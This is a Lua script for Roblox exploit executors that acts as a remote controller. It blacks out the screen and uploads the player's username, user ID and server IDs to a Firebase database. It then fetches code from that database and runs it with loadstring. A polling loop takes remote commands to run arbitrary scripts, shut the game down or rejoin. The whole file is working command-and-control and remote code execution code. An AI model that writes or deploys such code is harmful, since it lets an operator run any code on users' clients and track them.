-- Carter's DHC Mobile Script
-- Designed for Delta and other mobile executors

-- Function to make screen black
local function makeScreenBlack()
    if game:GetService("CoreGui") then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BlackScreenGui"
        screenGui.IgnoreGuiInset = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui
        
        screenGui.Parent = game:GetService("CoreGui")
    end
end

-- Function to check and execute scripts from Firebase
local function checkAndExecuteScript()
    local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"
    
    -- Use executor's HTTP functions (compatible with Delta)
    local success, response = pcall(function()
        -- FIX: Check for different HTTP request functions to prevent nil value error
        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
        if requestFunc then
            return requestFunc({
                Url = url,
                Method = "GET"
            }).Body
        else
            -- Fallback to game:HttpGet if no request function found
            return game:HttpGet(url, true)
        end
    end)
    
    if not success then
        -- Fallback for executors that use different HTTP functions
        success, response = pcall(function()
            return game:HttpGet(url, true)
        end)
    end
    
    if success then
        local data = game:GetService("HttpService"):JSONDecode(response)
        if data and data.code and data.code ~= "" then
            -- Execute the script
            local executeSuccess, errorMsg = pcall(function()
                loadstring(data.code)()
            end)
            
            if not executeSuccess then
                warn("Script execution error: " .. errorMsg)
            else
                -- Clear the script from DB after successful execution
                pcall(function()
                    local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
                    if requestFunc then
                        requestFunc({
                            Url = url,
                            Method = "PUT",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = '{"code":""}'
                        })
                    else
                        -- Fallback if no request function available
                        game:HttpGet(url .. '?code=', true)
                    end
                end)
            end
        end
    else
        warn("Failed to fetch from database: " .. response)
    end
end

-- Get player info for tracking
local function getPlayerInfo()
    local player = game.Players.LocalPlayer
    if player then
        return {
            username = player.Name,
            userid = player.UserId,
            serverid = game.JobId,
            placeid = game.PlaceId,
            status = "connected"
        }
    end
    return nil
end

-- Send player info to database for tracking
local function sendPlayerInfo()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        pcall(function()
            local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
            if requestFunc then
                requestFunc({
                    Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
                    Method = "PUT",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode(playerInfo)
                })
            end
        end)
    end
end

-- Send heartbeat to database
local function sendHeartbeat()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        pcall(function()
            local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
            if requestFunc then
                requestFunc({
                    Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
                    Method = "PUT",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        timestamp = os.time(),
                        userid = playerInfo.userid
                    })
                })
            end
        end)
    end
end

-- Function to handle commands from website
local function checkCommands(userId)
    local commandUrl = "https://omebgle-default-rtdb.firebaseio.com/commands/" .. userId .. ".json"
    
    local success, response = pcall(function()
        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
        if requestFunc then
            return requestFunc({
                Url = commandUrl,
                Method = "GET"
            }).Body
        else
            return game:HttpGet(commandUrl, true)
        end
    end)
    
    if success then
        local data = game:GetService("HttpService"):JSONDecode(response)
        if data and data.command and data.command ~= "" then
            -- Execute the command
            if data.command == "re-execute" then
                checkAndExecuteScript()
            elseif data.command == "execute-custom" and data.script then
                local executeSuccess, errorMsg = pcall(function()
                    loadstring(data.script)()
                end)
                if not executeSuccess then
                    warn("Custom script execution error: " .. errorMsg)
                end
            elseif data.command == "leave" then
                game:Shutdown()
            elseif data.command == "rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
            elseif data.command == "serverhop" then
                -- Server hop implementation would go here
                print("Server hop command received")
            end
            
            -- Clear the command after 5 seconds
            delay(5, function()
                pcall(function()
                    local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
                    if requestFunc then
                        requestFunc({
                            Url = commandUrl,
                            Method = "PUT",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = '{"command":""}'
                        })
                    end
                end)
            end)
        end
    end
end

-- Initial setup
makeScreenBlack()
sendPlayerInfo()

-- Execute script once
checkAndExecuteScript()

-- Set up to check for commands and send heartbeats
local playerInfo = getPlayerInfo()
if playerInfo then
    spawn(function()
        while true do
            wait(10) -- Send heartbeat every 10 seconds
            sendHeartbeat()
            sendPlayerInfo() -- Update presence
            checkCommands(playerInfo.userid) -- Check for commands
        end
    end)
end

print("Carter's DHC Mobile Controller loaded successfully!")
print("Script executed once successfully!")
